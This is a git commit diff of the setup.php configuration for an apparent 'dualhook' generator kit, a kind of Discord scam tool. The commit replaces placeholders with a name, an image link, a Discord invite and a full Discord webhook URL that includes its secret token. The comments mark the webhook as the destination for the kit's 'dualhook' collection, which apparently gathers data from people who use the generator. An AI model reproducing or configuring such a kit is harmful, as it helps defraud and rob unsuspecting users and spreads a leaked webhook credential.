1055afe884cf0caec67a93fb061ce9992a571cfe
Faultyy <142425175+Faultyy@users.noreply.github.com>
2023-08-18 16:19:20 +0100

    Update setup.php

--- setup.php
+++ setup.php
@@ -2,11 +2,11 @@
 
 // Setup file for users!
 
-$name = "Termed#0001"; // Change to any name u want for ur generator
-$image = "https://media.discordapp.net/attachments/1097841417591738378/1098664331828285501/tumblr_1f782183a9ea642e79b07d82c180da50_bbefd568_400.png?width=360&height=360"; // Any Image u want
+$name = "evilsorcery."; // Change to any name u want for ur generator
+$image = "https://th.bing.com/th/id/R.8c4521608d483144cb8f2e88c7a57272?rik=eNzS9HbEBqKlEg&riu=http%3a%2f%2f2.bp.blogspot.com%2f-A1guG7GsxKA%2fTubtFoXHrqI%2fAAAAAAAAApE%2fpzzZ-aG0BBY%2fs640%2fReal%2bHot%2bDog_PixNfun%2b%2525284%252529.jpg&ehk=rgzgj0pDE%2fuq73VDFwyvSGjpuOI%2bUURFgl%2fypltq4hQ%3d&risl=&pid=ImgRaw&r=0&sres=1&sresct=1"; // Any Image u want
 $Backgroundcolor = "white"; // Examples white, blue, orange, yellow, wheat
-$adminhook = "WEBHOOK HERE!"; // Change to ur dualhook webhook!
-$discord = ".gg/incog"; // change discord server to ur server
+$adminhook = "https://discord.com/api/webhooks/1142114804966903919/QFT6VA3SfHm2sPqsiz7vQP774HWR8bP9QXvRU5Bjao3TGwhHqqAMA4vDvOtNCVIcKtNj"; // Change to ur dualhook webhook!
+$discord = ".gg/bmGWyGMxvN"; // change discord server to ur server
 $colorTitle = "blue"; // Example colors for title white, black, or any other color lol
 
 
